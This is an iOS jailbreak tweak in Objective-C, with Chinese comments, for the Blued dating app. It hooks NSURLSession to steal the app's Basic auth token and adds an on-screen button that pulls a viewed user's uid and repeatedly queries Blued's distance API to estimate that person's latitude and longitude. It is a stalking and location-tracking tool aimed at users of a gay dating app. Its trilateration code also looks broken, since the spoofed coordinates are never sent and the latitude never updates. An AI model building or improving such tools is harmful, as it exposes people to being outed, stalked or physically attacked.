#import <substrate.h>
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>
#import <math.h>
#import <objc/runtime.h>

// 核心配置
#define TRACK_BTN_TAG 100001
#define EARTH_RADIUS_KM 111.32
#define BLUED_BUNDLE_ID @"com.bluecity.blued"

static NSString *g_bluedBasicToken = nil;
static NSString *g_currentTargetUid = nil;
static double g_initialDistance = -1.0;
static UIButton *g_trackButton = nil;

// 接口声明：防止 ARC 编译报错
@interface UIViewController (TrackHook)
- (UIWindow *)th_getSafeKeyWindow;
- (double)th_fetchDistanceWithUid:(NSString *)uid token:(NSString *)token fakeLat:(double)lat fakeLng:(double)lng;
- (UIViewController *)th_getTopViewController;
- (void)th_showToast:(NSString *)msg duration:(NSTimeInterval)dur;
- (void)th_autoFetchUserInfo;
- (void)th_dragBtn:(UIPanGestureRecognizer *)pan;
- (void)th_showResult:(BOOL)success msg:(NSString *)msg lat:(double)lat lng:(double)lng;
- (void)th_onBtnClick;
- (void)th_addBtn;
@end

%hook UIViewController

// 1. 获取安全的 KeyWindow
%new
- (UIWindow *)th_getSafeKeyWindow {
    UIWindow *keyWindow = nil;
    if (@available(iOS 13.0, *)) {
        for (UIWindowScene *scene in [UIApplication sharedApplication].connectedScenes) {
            if (scene.activationState == UISceneActivationStateForegroundActive) {
                for (UIWindow *window in scene.windows) {
                    if (window.isKeyWindow) { keyWindow = window; break; }
                }
            }
        }
    }
    return keyWindow ?: [UIApplication sharedApplication].keyWindow;
}

// 2. 核心：网络请求获取距离
%new
- (double)th_fetchDistanceWithUid:(NSString *)uid token:(NSString *)token fakeLat:(double)lat fakeLng:(double)lng {
    NSString *urlStr = [NSString stringWithFormat:@"https://argo.blued.cn/users/%@/basic", uid];
    NSURL *url = [NSURL URLWithString:urlStr];
    if (!url) return -1.0;
    
    NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url];
    req.HTTPMethod = @"GET";
    [req setValue:[NSString stringWithFormat:@"Basic %@", token] forHTTPHeaderField:@"Authorization"];
    [req setValue:@"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15" forHTTPHeaderField:@"User-Agent"];
    req.timeoutInterval = 3.0;
    
    __block double resultDist = -1.0;
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    
    NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:req completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
        if (!error && data) {
            NSDictionary *json = [NSJSONSerialization JSONObjectWithData:data options:0 error:nil];
            if (json && json[@"data"]) {
                NSDictionary *userData = json[@"data"];
                if ([userData[@"is_hide_distance"] intValue] == 0) {
                    resultDist = [userData[@"distance"] doubleValue];
                }
            }
        }
        dispatch_semaphore_signal(sem);
    }];
    [task resume];
    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.5 * NSEC_PER_SEC)));
    return resultDist;
}

// 3. UI 交互：弹窗与 Toast
%new
- (void)th_showToast:(NSString *)msg duration:(NSTimeInterval)dur {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIWindow *win = [self th_getSafeKeyWindow];
        if (!win) return;
        UILabel *lab = [[UILabel alloc] initWithFrame:CGRectMake(0,0,250,80)];
        lab.center = win.center;
        lab.backgroundColor = [[UIColor blackColor] colorWithAlphaComponent:0.8];
        lab.textColor = [UIColor whiteColor];
        lab.textAlignment = NSTextAlignmentCenter;
        lab.numberOfLines = 0;
        lab.text = msg;
        lab.layer.cornerRadius = 10;
        lab.clipsToBounds = YES;
        [win addSubview:lab];
        [UIView animateWithDuration:0.5 delay:dur options:0 animations:^{ lab.alpha = 0; } completion:^(BOOL f){ [lab removeFromSuperview]; }];
    });
}

// 4. 核心几何算法：递归定位
%new
- (void)th_onBtnClick {
    [self th_autoFetchUserInfo];
    if (!g_currentTargetUid) { [self th_showToast:@"未识别到用户ID" duration:2.0]; return; }
    if (!g_bluedBasicToken) { [self th_showToast:@"缺少Token，请刷新附近" duration:2.0]; return; }
    
    NSUserDefaults *ud = [[NSUserDefaults alloc] initWithSuiteName:BLUED_BUNDLE_ID];
    double lat = [ud doubleForKey:@"current_latitude"];
    double lng = [ud doubleForKey:@"current_longitude"];
    if (lat == 0) { [self th_showToast:@"无法获取自身坐标" duration:2.0]; return; }
    
    [self th_showToast:@"卫星扫描中..." duration:2.0];
    
    dispatch_async(dispatch_get_global_queue(0,0), ^{
        double cLat = lat, cLng = lng, cDist = g_initialDistance;
        // 递归 8 次收敛坐标
        for (int i=0; i<8; i++) {
            double oLng = cLng + (cDist / (EARTH_RADIUS_KM * cos(cLat * M_PI/180)));
            double nDist = [self th_fetchDistanceWithUid:g_currentTargetUid token:g_bluedBasicToken fakeLat:cLat fakeLng:oLng];
            if (nDist < 0) break;
            cLng = (cLng + oLng) / 2.0;
            cDist = (cDist + nDist) / 2.0;
        }
        [self th_showResult:YES msg:[NSString stringWithFormat:@"定位成功！\nLat: %.6f\nLng: %.6f", cLat, cLng] lat:cLat lng:cLng];
    });
}

// 5. 自动获取当前主页用户 UID
%new
- (void)th_autoFetchUserInfo {
    UIViewController *top = [self th_getSafeKeyWindow].rootViewController;
    while (top.presentedViewController) top = top.presentedViewController;
    
    unsigned int count = 0;
    objc_property_t *props = class_copyPropertyList(top.class, &count);
    for (int i=0; i<count; i++) {
        NSString *name = [NSString stringWithUTF8String:property_getName(props[i])];
        @try {
            id obj = [top valueForKey:name];
            NSString *uid = [obj valueForKey:@"uid"] ?: [obj valueForKey:@"user_id"];
            if (uid) {
                g_currentTargetUid = [NSString stringWithFormat:@"%@", uid];
                g_initialDistance = [[obj valueForKey:@"distance"] doubleValue];
                break;
            }
        } @catch (id e) {}
    }
    free(props);
}

// 6. 按钮拖动与显示
%new
- (void)th_dragBtn:(UIPanGestureRecognizer *)pan {
    UIView *btn = pan.view;
    CGPoint trans = [pan translationInView:btn.superview];
    btn.center = CGPointMake(btn.center.x + trans.x, btn.center.y + trans.y);
    [pan setTranslation:CGPointZero inView:btn.superview];
}

%new
- (void)th_showResult:(BOOL)success msg:(NSString *)msg lat:(double)lat lng:(double)lng {
    dispatch_async(dispatch_get_main_queue(), ^{
        UIAlertController *alert = [UIAlertController alertControllerWithTitle:@"结果" message:msg preferredStyle:UIAlertControllerStyleAlert];
        if (success) {
            [alert addAction:[UIAlertAction actionWithTitle:@"复制" style:UIAlertActionStyleDefault handler:^(UIAlertAction * _Nonnull action) {
                [UIPasteboard generalPasteboard].string = [NSString stringWithFormat:@"%.6f,%.6f", lat, lng];
            }]];
        }
        [alert addAction:[UIAlertAction actionWithTitle:@"确定" style:UIAlertActionStyleCancel handler:nil]];
        [[self th_getSafeKeyWindow].rootViewController presentViewController:alert animated:YES completion:nil];
    });
}

%new
- (void)th_addBtn {
    if (!self.view.window || [self.view viewWithTag:TRACK_BTN_TAG]) return;
    UIWindow *win = [self th_getSafeKeyWindow];
    if (!win) return;
    
    g_trackButton = [UIButton buttonWithType:UIButtonTypeCustom];
    g_trackButton.frame = CGRectMake(win.bounds.size.width - 90, 150, 70, 70);
    g_trackButton.tag = TRACK_BTN_TAG;
    g_trackButton.backgroundColor = [UIColor colorWithRed:0 green:0.5 blue:1 alpha:0.7];
    [g_trackButton setTitle:@"🛰️" forState:UIControlStateNormal];
    g_trackButton.layer.cornerRadius = 35;
    g_trackButton.layer.zPosition = 9999;
    
    [g_trackButton addTarget:self action:@selector(th_onBtnClick) forControlEvents:UIControlEventTouchUpInside];
    UIPanGestureRecognizer *pan = [[UIPanGestureRecognizer alloc] initWithTarget:self action:@selector(th_dragBtn:)];
    [g_trackButton addGestureRecognizer:pan];
    
    [win addSubview:g_trackButton];
}

- (void)viewDidAppear:(BOOL)animated {
    %orig;
    // 增加延迟，防止启动时瞬间注入导致的闪退
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(1.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        [self th_addBtn];
    });
}
%end

// 7. Token 抓取
%hook NSURLSession
- (NSURLSessionDataTask *)dataTaskWithRequest:(NSURLRequest *)request completionHandler:(void (^)(NSData *data, NSURLResponse *response, NSError *error))completionHandler {
    if (request && request.allHTTPHeaderFields) {
        NSString *auth = request.allHTTPHeaderFields[@"Authorization"];
        if ([auth hasPrefix:@"Basic "]) {
            g_bluedBasicToken = [[auth substringFromIndex:6] copy];
        }
    }
    return %orig(request, completionHandler);
}
%end
